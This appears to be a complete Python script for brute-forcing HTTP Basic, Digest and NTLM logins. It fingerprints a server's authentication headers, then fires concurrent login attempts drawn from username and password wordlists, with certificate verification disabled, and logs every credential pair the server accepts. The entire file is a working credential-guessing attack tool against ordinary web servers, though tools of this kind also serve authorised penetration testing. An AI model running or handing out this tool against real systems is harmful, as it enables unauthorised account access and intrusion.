#!/usr/bin/env python3

import re
import sys
import argparse
import requests
import requests_ntlm
import grequests
import validators
import itertools
import datetime
import time

from lib import logger


# Disable InsecureRequestWarning for unverified HTTPS request
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

log = logger.logger()


def print_banner():

    banner = '-------------------------\n' \
             '~ HTTP Auth Bruteforcer ~\n' \
             '-------------------------\n'

    log.info(banner)


def parse_args():
    def check_arg_url(value):
        try:
            validators.url(value)
        except:
            raise Exception('URL is not valid')
        return value

    def check_arg_auth_type(value):
        if value not in ['basic', 'digest', 'ntlm']:
            raise Exception('Authentication type not valid')
        return value

    def check_arg_buffer_size(value):
        try:
            value = int(value)
        except:
            raise Exception('Buffer size is not a integer')
        if value < 1 or value > 10:
            raise Exception('Buffer size should be 1 < buffer size < 10')
        return value

    parser = argparse.ArgumentParser(description='HTTP Auth Bruteforcer')
    parser.add_argument('url', metavar='url', type=check_arg_url, help='URL protected by authentication')
    parser.add_argument('-a', '--authtype', type=check_arg_auth_type, required=True, help='Authentication type ("basic", "digest" or "ntlm")')
    parser.add_argument('-b', '--buffersize', type=check_arg_buffer_size, default=10, help='Requests buffer size (0 < buffer size <= 10)')
    parser.add_argument('-c', '--credentialsfile', type=argparse.FileType('r'), help='File containing the usernames and passwords (one "username:password" per line)')
    parser.add_argument('-u', '--usernamesfile', type=argparse.FileType('r'), help='File containing the usernames (one "username" per line)')
    parser.add_argument('-p', '--passwordsfile', type=argparse.FileType('r'), help='File containing the passwords (one "password" per line)')
    args = parser.parse_args()

    return args


def print_server_informations(url):
    try:
        resp = requests.get(url, verify=False, timeout=5)
        log.info('URL: ' + url)
        log.info('Response status code: ' + str(resp.status_code))
        log.info('Server: ' + resp.headers['Server'])
        log.info('Date: ' + resp.headers['Date'])
        try:
            auth_type = resp.headers['WWW-Authenticate']
            if 'ntlm' in auth_type.lower():
                log.info('Authentication type: ' + resp.headers['WWW-Authenticate'])
            else:
                log.info('Authentication type: ' + resp.headers['WWW-Authenticate'].split(' ')[0])
        except:
            pass
        try:
            realm = re.search(r'realm="(.*?)"', resp.headers['WWW-Authenticate']).group(1)
            log.info('Authentication information: realm:' + str(realm))
        except:
            pass
        try:
            algorithm = re.search(r'algorithm=(.*?),', resp.headers['WWW-Authenticate']).group(1)
            log.info('Authentication information: algorithm:' + str(algorithm))
        except:
            pass
        try:
            domain = re.search(r'domain="(.*?)"', resp.headers['WWW-Authenticate']).group(1)
            if len(domain.split(' ')) != 1:
                for domain in domain.split(' '):
                    log.info('Authentication information: domain:' + str(domain))
            else:
                log.info('Authentication information: domain:' + str(domain))
        except:
            pass

    except:
        log.info('Error while requesting URL + "' + url + '"')


def check_url_requires_auth(url):
    try:
        resp = requests.get(url, verify=False, timeout=5)
        if resp.status_code != 401:
            return False
        else:
            return True
    except:
        log.info('Error while requesting URL + "' + url + '"')
        return False

    return False


class Credentials:
    def __init__(self, username, password):
        self.username = username
        self.password = password


class HTTPAuthUtils:
    @staticmethod
    def get_credentials_from_basic_requests(reqs_list):
        credentials_list = []

        for req in reqs_list:
            req_resp_status_code = vars(vars(req)['response'])['status_code']

            if req_resp_status_code == 200:
                req_username = vars(vars(req)['kwargs']['auth'])['username']
                req_password = vars(vars(req)['kwargs']['auth'])['password']

                credentials_list.append(Credentials(req_username, req_password))

        return credentials_list

    @staticmethod
    def get_credentials_from_digest_requests(reqs_list):
        credentials_list = []

        for req in reqs_list:
            req_resp_status_code = vars(vars(req)['response'])['status_code']

            if req_resp_status_code == 200:
                req_username = vars(vars(req)['kwargs']['auth'])['username']
                req_password = vars(vars(req)['kwargs']['auth'])['password']

                credentials_list.append(Credentials(req_username, req_password))

        return credentials_list

    @staticmethod
    def get_credentials_from_ntlm_requests(reqs_list):
        credentials_list = []

        for req in reqs_list:
            req_resp_status_code = vars(vars(req)['response'])['status_code']

            if req_resp_status_code == 200:
                req_domain = vars(vars(req)['kwargs']['auth'])['domain']
                req_username = vars(vars(req)['kwargs']['auth'])['username']
                req_password = vars(vars(req)['kwargs']['auth'])['password']

                credentials_list.append(Credentials(req_domain + '\\' + req_username, req_password))

        return credentials_list


def credentials_generator_from_credentials_file(credentials_file_object, buffer_size):
    credentials_buffer = []

    for line in credentials_file_object:
        username = line.strip().split(':')[0]
        password = line.strip().split(':')[1]

        credentials = Credentials(username, password)

        credentials_buffer.append(credentials)

        if len(credentials_buffer) >= buffer_size:
            yield credentials_buffer

            credentials_buffer = []

    if len(credentials_buffer) != 0:
        yield credentials_buffer


def credentials_generator_from_username_and_password_files(username_file_object, password_file_object, buffer_size):
    credentials_buffer = []

    for uline in username_file_object:
        username = uline.strip()

        password_file_object, password_file_object_this_loop = itertools.tee(password_file_object)

        for pline in password_file_object_this_loop:
            password = pline.strip()

            credentials = Credentials(username, password)

            credentials_buffer.append(credentials)

            if len(credentials_buffer) >= buffer_size:
                yield credentials_buffer

                credentials_buffer = []

    if len(credentials_buffer) != 0:
        yield credentials_buffer


def test_basic_auth(url, credentials_buffer):
    auth_successes = []

    timeout = 5
    verify = False

    requests_buffer = []

    for credentials in credentials_buffer:
        auth = requests.auth.HTTPBasicAuth(credentials.username, credentials.password)
        requests_buffer.append(grequests.get(url=url, auth=auth, verify=verify, timeout=timeout))

    resps = grequests.map(requests_buffer)

    if 200 in [resp.status_code for resp in resps]:
        credentials = HTTPAuthUtils.get_credentials_from_basic_requests(requests_buffer)

        auth_successes.extend(credentials)

    return auth_successes


def test_digest_auth(url, credentials_buffer):
    auth_successes = []

    timeout = 5
    verify = False

    requests_buffer = []

    for credentials in credentials_buffer:
        auth = requests.auth.HTTPDigestAuth(credentials.username, credentials.password)
        requests_buffer.append(grequests.get(url=url, auth=auth, verify=verify, timeout=timeout))

    resps = grequests.map(requests_buffer)

    if 200 in [resp.status_code for resp in resps]:
        credentials = HTTPAuthUtils.get_credentials_from_digest_requests(requests_buffer)

        auth_successes.extend(credentials)

    return auth_successes


def test_ntlm_auth(url, credentials_buffer):
    auth_successes = []

    timeout = 15
    verify = False

    requests_buffer = []

    for credentials in credentials_buffer:
        auth = requests_ntlm.HttpNtlmAuth(credentials.username, credentials.password)
        requests_buffer.append(grequests.get(url=url, auth=auth, verify=verify, timeout=timeout))

    resps = grequests.map(requests_buffer)

    if 200 in [resp.status_code for resp in resps]:
        credentials_list = HTTPAuthUtils.get_credentials_from_ntlm_requests(requests_buffer)

        auth_successes.extend(credentials_list)

    return auth_successes


def main():
    # Parse arguments
    args = parse_args()

    # Print banner and check URL
    print_banner()
    print_server_informations(args.url)

    url_requires_auth = check_url_requires_auth(args.url)

    if not url_requires_auth:
        sys.exit(0)

    log.info('')

    # Set credential generator
    creds_generator = None
    if args.credentialsfile:
        creds_generator = credentials_generator_from_credentials_file(args.credentialsfile, args.buffersize)
        log.info('Credentials file: ' + args.credentialsfile.name)
    elif args.usernamesfile and args.passwordsfile:
        creds_generator = credentials_generator_from_username_and_password_files(args.usernamesfile, args.passwordsfile, args.buffersize)
        log.info('Usernames file: ' + args.usernamesfile.name)
        log.info('Passwords file: ' + args.passwordsfile.name)

    else:
        log.error('No input credentials file specified.')
        sys.exit(0)

    # Test credentials on URL
    log.info('')
    log.info('Authentication tests begin...')
    log.info('Date: ' + datetime.datetime.now().strftime('%H:%M:%S %d/%m/%Y'))
    log.info('')

    count = 0
    print_count = 0

    for credentials_buffer in creds_generator:
        auth_successes = []

        if args.authtype == 'basic':
            auth_successes = test_basic_auth(args.url, credentials_buffer)
        elif args.authtype == 'digest':
            auth_successes = test_digest_auth(args.url, credentials_buffer)
        elif args.authtype == 'ntlm':
            auth_successes = test_ntlm_auth(args.url, credentials_buffer)
        else:
            raise Exception('Auth type ' + args.authtype + ' not known')

        if len(auth_successes) != 0:
            for credentials in auth_successes:
                log.success('Authentication success: username: ' + credentials.username + ', password: ' + credentials.password)

        count += len(credentials_buffer)

        log.info('Authentication attempts: ' + str(count), update=True)

        time.sleep(0.5)

    log.info('')
    log.info('Authentication tests finished.')
    log.info('Date: ' + datetime.datetime.now().strftime('%H:%M:%S %d/%m/%Y'))

if __name__ == '__main__':
    main()
